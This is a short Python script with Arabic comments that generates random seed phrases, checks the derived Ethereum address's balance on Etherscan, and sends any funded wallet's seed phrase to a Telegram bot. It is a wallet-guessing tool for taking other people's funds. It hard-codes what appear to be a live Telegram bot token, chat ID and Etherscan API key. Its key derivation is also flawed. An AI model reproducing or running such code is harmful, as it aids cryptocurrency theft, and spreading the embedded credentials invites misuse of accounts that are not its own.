import requests
from mnemonic import Mnemonic
from eth_account import Account

# إعداد بيانات بوت تيليجرام
TELEGRAM_BOT_TOKEN = "7006210929:AAGhfsURXG1lg6mDpt2NKRE8HysZLWu9WIg"
TELEGRAM_CHAT_ID = "7016098393"

# إعداد مفتاح Etherscan
ETHERSCAN_API_KEY = "ab9329c72c2944f1ab97b6b14c050e9a"
ETHERSCAN_URL = "https://api.etherscan.io/api"

# توليد عبارة الاسترداد (Seed Phrase)
mnemo = Mnemonic("english")
seed_phrase = mnemo.generate(strength=128)
print("Your 12-word Seed Phrase:")
print(seed_phrase)

# تحويل عبارة الاسترداد إلى مفتاح خاص
seed_bytes = mnemo.to_seed(seed_phrase)
private_key = Account.from_key(seed_bytes[:32]).key.hex()

# إنشاء الحساب باستخدام المفتاح الخاص
account = Account.from_key(private_key)
wallet_address = account.address

print("\nWallet Address:", wallet_address)

# جلب الرصيد باستخدام Etherscan API
params = {
    "module": "account",
    "action": "balance",
    "address": wallet_address,
    "tag": "latest",
    "apikey": ETHERSCAN_API_KEY,
}

response = requests.get(ETHERSCAN_URL, params=params).json()

if response["status"] == "1":
    balance_wei = int(response["result"])
    balance_eth = balance_wei / 10**18
    print(f"\nWallet Balance: {balance_eth} ETH")

    # إرسال المحفظة إذا كان بها رصيد
    if balance_eth > 0:
        message = f"🚀 Wallet with Balance Found!\n\n🔑 Seed Phrase:\n{seed_phrase}\n\n🔗 Address: {wallet_address}\n💰 Balance: {balance_eth} ETH"
        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        telegram_params = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
        
        requests.get(telegram_url, params=telegram_params)
        print("\n✅ Wallet details sent to Telegram!")
    else:
        print("\n❌ No balance found, not sending to Telegram.")
else:
    print("\n❌ Failed to fetch balance.")
